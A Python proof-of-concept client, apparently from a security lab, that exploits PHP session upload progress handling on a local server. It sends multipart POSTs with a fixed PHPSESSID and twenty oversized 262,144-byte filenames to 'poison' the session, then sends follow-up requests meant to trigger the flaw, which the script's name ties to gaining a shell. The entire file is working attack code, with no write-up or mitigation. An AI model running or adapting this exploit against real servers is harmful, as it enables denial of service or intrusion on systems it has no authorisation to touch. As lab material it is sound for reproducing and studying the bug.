#!/usr/bin/env python3
"""php2shell lab client: poison + trigger sequence. Usage: python3 client.py [port]"""
import http.client, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8091
B = b"----php2shellboundary"

def part(name, value, fname=None):
    s = ('--' + B.decode() + '\r\nContent-Disposition: form-data; name="' + name + '"')
    if fname is not None:
        s += '; filename="' + fname + '"'
    s += '\r\n\r\n'
    return s.encode() + value + b'\r\n'

def endpart():
    return b'--' + B + b'--\r\n'

def req(tag, body, timeout=60):
    t0 = time.time()
    try:
        c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=timeout)
        c.request('POST', '/', body=body,
                  headers={'Content-Type': 'multipart/form-data; boundary=----php2shellboundary'})
        r = c.getresponse()
        d = r.read()
        c.close()
        print(f"[{tag}] {time.time()-t0:.1f}s HTTP {r.status} len={len(d)} {d[:100]!r}", flush=True)
        return r.status, d
    except Exception as e:
        print(f"[{tag}] {time.time()-t0:.1f}s ERROR: {e}", flush=True)
        return None, b""

def wait_port(port, tries=40):
    import socket
    for i in range(tries):
        try:
            s = socket.create_connection(('127.0.0.1', port), timeout=1)
            s.close()
            return True
        except OSError:
            time.sleep(1)
    return False

def main():
    if not wait_port(PORT):
        print("server did not come up", flush=True)
        return
    fname = b"A" * 262144
    body1 = part('PHPSESSID', b'pocsid1') + part('PHP_SESSION_UPLOAD_PROGRESS', b'pk1')
    for i in range(20):
        body1 += part('f' + str(i), b'DATA', fname.decode())
    body1 += endpart()
    print(f"[R1] size={len(body1)}", flush=True)
    req('R1-poison', body1, timeout=90)

    body2 = part('PHPSESSID', b'pocsid1') + part('PHP_SESSION_UPLOAD_PROGRESS', b'pk1b') \
         + part('f0', b'DATA', 'small.txt') + endpart()
    print(f"[R2] size={len(body2)} (same sid)", flush=True)
    req('R2-same', body2, timeout=45)
    time.sleep(3)

    body3 = part('PHPSESSID', b'pocsid2') + part('PHP_SESSION_UPLOAD_PROGRESS', b'pk2') \
         + part('f0', b'DATA', 'small.txt') + endpart()
    print(f"[R3] size={len(body3)} (diff sid)", flush=True)
    req('R3-diff', body3, timeout=45)

    body4 = part('PHPSESSID', b'pocsid3') + part('PHP_SESSION_UPLOAD_PROGRESS', b'pk3') \
         + part('f0', b'DATA', 'small.txt') + endpart()
    req('R4-diff2', body4)

if __name__ == '__main__':
    main()
